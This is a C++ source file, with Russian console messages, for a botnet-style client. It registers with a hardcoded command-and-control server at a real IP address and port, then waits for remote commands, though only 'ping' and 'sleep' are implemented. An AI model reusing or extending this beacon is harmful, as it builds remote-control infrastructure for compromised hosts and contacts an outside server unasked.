#include <iostream>
#include <string>
#include <sstream>
#include <cstdlib>
#include <ctime>
#include <thread>
#include <chrono>
#include <random> 

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h> 
#pragma comment(lib, "ws2_32.lib")
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#define SOCKET int
#define INVALID_SOCKET -1
#define SOCKET_ERROR -1
#endif

using namespace std;

const string CONTROLLER_IP = "81.200.153.234";
const int CONTROLLER_PORT = 12345;

#ifdef _WIN32
bool initialize_winsock() {
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        cerr << "WSAStartup failed: " << result << endl;
        return false;
    }
    return true;
}
#endif

string generate_bot_id() {
    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> distrib(1000, 9999);

    return to_string(distrib(gen));
}

string BOT_ID = generate_bot_id();

bool register_with_controller(SOCKET& sock) {
    try {
        sockaddr_in server_address;
        server_address.sin_family = AF_INET;
        server_address.sin_port = htons(CONTROLLER_PORT);

        if (inet_pton(AF_INET, CONTROLLER_IP.c_str(), &(server_address.sin_addr)) <= 0) {
            cerr << "inet_pton failed for IP address: " << CONTROLLER_IP << endl;
            return false;
        }

        if (connect(sock, (sockaddr*)&server_address, sizeof(server_address)) == SOCKET_ERROR) {
            cerr << "Connection failed. Error: " <<
#ifdef _WIN32
                WSAGetLastError()
#else
                errno
#endif
                << endl;
            return false;
        }

        string message = "{\"bot_id\": \"" + BOT_ID + "\", \"action\": \"register\"}";
        if (send(sock, message.c_str(), message.length(), 0) == SOCKET_ERROR) {
            cerr << "Send failed. Error: " <<
#ifdef _WIN32
                WSAGetLastError()
#else
                errno
#endif
                << endl;
            return false;
        }

        char buffer[1024];
        int bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (bytes_received > 0) {
            buffer[bytes_received] = '\0';
            cout << "Ответ от контроллера: " << buffer << endl;
        }
        else {
            cerr << "Ошибка при получении данных от контроллера. Error: " <<
#ifdef _WIN32
                WSAGetLastError()
#else
                errno
#endif
                << endl;
            return false;
        }

        return true;
    }
    catch (const exception& e) {
        cerr << "Exception in register_with_controller: " << e.what() << endl;
        return false;
    }
}

void execute_command(const string& command) {
    cout << "Выполняю команду: " << command << endl;
    if (command == "ping") {
        cout << "Bot " << BOT_ID << ": Pong!" << endl;
    }
    else if (command == "sleep") {
        random_device rd;
        mt19937 gen(rd());
        uniform_int_distribution<> distrib(1, 5); // Диапазон 1-5 секунд

        int sleep_time = distrib(gen);

        cout << "Bot " << BOT_ID << ": Sleeping for " << sleep_time << " seconds..." << endl;
        this_thread::sleep_for(chrono::seconds(sleep_time));
        cout << "Bot " << BOT_ID << ": Woke up!" << endl;
    }
    else {
        cout << "Bot " << BOT_ID << ": Неизвестная команда: " << command << endl;
    }
}

int main() {
    setlocale(LC_ALL, "RUS");

#ifdef _WIN32
    if (!initialize_winsock()) {
        return 1;
    }
#endif

    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        cerr << "Could not create socket. Error: " <<
#ifdef _WIN32
            WSAGetLastError()
#else
            errno
#endif
            << endl;
        return 1;
    }

    if (!register_with_controller(sock)) {
        closesocket(sock);
        return 1;
    }

    while (true) {
        char buffer[1024];
        int bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);

        if (bytes_received > 0) {
            buffer[bytes_received] = '\0';
            cout << "Получена команда: " << buffer << endl;
            execute_command(buffer);
        }
        else if (bytes_received == 0) {
            cout << "Контроллер отключился." << endl;
            break;
        }
        else {
            cerr << "Ошибка при получении данных. Error: " <<
#ifdef _WIN32
                WSAGetLastError()
#else
                errno
#endif
                << endl;
            break;
        }
    }

    closesocket(sock);
#ifdef _WIN32
    WSACleanup();
#endif
    return 0;
}
